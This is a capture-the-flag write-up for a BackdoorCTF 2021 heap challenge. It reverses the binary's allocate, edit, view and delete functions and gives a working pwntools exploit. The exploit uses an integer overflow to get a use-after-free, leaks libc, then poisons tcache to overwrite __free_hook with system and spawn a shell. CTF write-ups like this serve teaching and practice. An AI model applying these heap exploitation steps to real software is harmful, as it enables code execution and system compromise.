# BackdoorCTF 2021
pwn, 500.

I didn't manage to solve this challenge during the ctf , but i kept trying until i finished it so this is a little writeup so i can share what i learnt and for keeping it as a resource for me for next challs.
## Description
> A classic heap exploitation challenge but with a plot twist.

# Analysis
let's start by reversing the four main functions.

**All reversing was made in IDA PRO 7.5**

#### Create Function
```C
unsigned __int64 main_allocate()
{
  unsigned int number_of_chunks; // [rsp+Ch] [rbp-14h] BYREF
  unsigned int choice; // [rsp+10h] [rbp-10h] BYREF
  unsigned int i; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf("How many chunks do you wanna allocate: ");
  number_of_chunks = 0;
  __isoc99_scanf("%u", &number_of_chunks);
  puts("Select the size: ");
  men_for_chunk_sizes();
  choice = 0;
  __isoc99_scanf("%d", &choice);
  for ( i = 0; i < number_of_chunks; ++i )
  {
    TODO();
    counter2_and_allocation(choice);
  }
  return __readfsqword(0x28u) ^ v4;
}
```
We are Prompted to enter the number of chunks we want to allocate. Then we chose the size we want from a menu.
```C
int men_for_chunk_sizes()
{
  puts("1. Large size.");
  puts("2. Medium size.");
  puts("3. Small size.");
  return printf(">> ");
}
```
Then we enter a loop which loops depending on how many chunks we are going to allocate
If we focus a little bit in here we can notice a strange thing happening which is we have 2 counters incrementing, We will figure out why later on.
 
 **counter2_and_allocation()**
```C
void __fastcall counter2_and_allocation(int a1)
{
  unsigned int index; // ebx
  int size; // [rsp+1Ch] [rbp-14h]

  if ( a1 == 3 )                                // small
  {
    size = 128;
  }
  else
  {
    if ( a1 > 3 )
      return;
    if ( a1 == 1 )                              // large
    {
      size = 1040;
    }
    else
    {
      if ( a1 != 2 )                            // medium
        return;
      size = 512;
    }
  }
  if ( (unsigned int)index_counter > 16 )       
    exit(0);
  index = index_counter++;
  notes[index] = malloc(size);
}
```
 **TODO()**
```C
__int64 TODO()
{
  return (unsigned int)++COUNTER_FROM_TODO;
}
```

#### Edit function
```C
__int64 edit()
{
  int index; // [rsp+8h] [rbp-8h]
  int size; // [rsp+Ch] [rbp-4h]

  printf("Index to edit: ");
  index = get_input();
  if ( index < 0 || index > 16 )
    exit(0);
  printf("Enter size: ");
  size = get_input();
  if ( size > 128 )
    exit(0);
  return read_input(*((void **)&notes + index), size);
}
```
Simple and clean it gets the index to edit and prompts for a size which need to not be larger than 128.

#### View function
```C
int view()
{
  int index; // [rsp+Ch] [rbp-4h]

  printf("Index to view: ");
  index = get_input();
  if ( index < 0 || index > 16 )
    exit(0);
  return puts(*((const char **)&notes + index));
}
```
As simple as edit function it gets and index and shows the content of a note.

#### Delete function
```C
unsigned __int64 delete()
{
  unsigned __int64 result; // rax

  result = (unsigned int)index_counter;
  if ( index_counter )
  {
    if ( COUNTER_FROM_TODO > (unsigned int)index_counter )
    {
      fwrite("Hacking detected!!!\nExiting...\n", 1uLL, 0x1FuLL, stderr);
      exit(0);
    }
    free(*((void **)&notes + (unsigned int)--index_counter));
    --COUNTER_FROM_TODO;
    result = (unsigned __int64)&notes;
    *((_QWORD *)&notes + (unsigned int)COUNTER_FROM_TODO) = 0LL;
  }
  return result;
}
```
now the trick comes in here . if we are able to bypass this check where we are in a condition counter1 != counter2 and counter1 < counter2.
> ( COUNTER_FROM_TODO > (unsigned int)index_counter )

if we achieve that condition we can obtain a Use After Free which we can poison the forward pointer to get an arbitrary write.


 **How do we achieve it ?**
 
 Integer Oveflow attacks ! if you are not familliar with such topic u can refer to this article on CTF wiki 
 > https://ctf-wiki.mahaloz.re/pwn/linux/integeroverflow/intof/

We are done with analysis let's move on to Exploitation

# Exploit 
first i am going to set some helpers so i can interact with the binary .
```python
#!/usr/bin/env python3
import time
from pwn import *
context.log_level = "DEBUG"
context.arch = 'amd64'
p = process("./main")
libc = ELF("./libc-2.31.so")

def alloc(n,c):
    p.sendlineafter('>> ','1')
    p.sendlineafter(': ',str(n))
    p.sendlineafter(':',str(c))
def free():
    p.sendlineafter('>> ','2')
def edit(idx,size,data):
    p.sendlineafter('>> ','3')
    p.sendlineafter(': ',str(idx))
    p.sendlineafter(': ',str(size))
    p.sendline(data)
def view(idx):
    p.sendlineafter('>> ','4')
    p.sendlineafter(': ',str(idx))
def main():

  pause()
  p.interactive()

if __name__ == "__main__":
    main()

```

 **NB : I PATCHED THE BINARY USING PWNINIT**

#### First Step We Leak Libc

```python
    alloc(5,1)#0 1 2 3 4 # We Allocate 5 chunks of large size so when freed it will contain fd and bk pointers which are main_arena addressess.
    alloc(1,3)#5 Consolidation Prevention
    alloc(int(2**32) - 6 + 3,4) # Integer Overflow Attack ( to satisfy our condition about counter1 != counter2 && counter1 < counter2 )
    time.sleep(20) 
    free()  # GOES TO TCACHE BIN 
    free()  # THIS IS WHERE OUR CHUNK THAT HAVE LIBC ADDR 
    view(4)
    base = u64(p.recv(6).ljust(8,b"\x00")) - 0x1ebbe0
    log.success('LIBC BASE => ' + hex(base))
    pause()
```
#### Second Step We do some Calculation To Pop A Shell
```python
    system = base + libc.sym['system'] # Target to execute is system("/bin/sh");
    free_hook = base + libc.sym['__free_hook'] # we are going to overwrite free hook with system address
```

#### Final Step Create Overlapping Chunks To Perfom Tcache Poisining
```python
    alloc(4,2)
    free()
    free()
    time.sleep(0.5)
    edit(6,128,p64(free_hook))
    alloc(2,2)
    edit(7,128,p64(system))
    alloc(2,1)
    edit(9,128,b"/bin/sh\x00")
```
Now free hook is succesfully overwritten with system address 
we allocated a chunk and we put our string /bin/sh in it 
now trigger the shell we just free the last chunk which contains our string so instead of free(note[9]) it just goes like system(note[9]) which is system("/bin/sh\x00");
```python
    free()
``` 
Executing The exploit and sending **cat flag.txt** We Get  
> retr0{FAKE_FUCKING_FLAG}

I hope i made everything clear . 

Thanks ! .




```
References :
https://ctf-wiki.mahaloz.re/pwn/linux/integeroverflow/intof/
https://ctf-wiki.mahaloz.re/pwn/linux/glibc-heap/use_after_free/
```


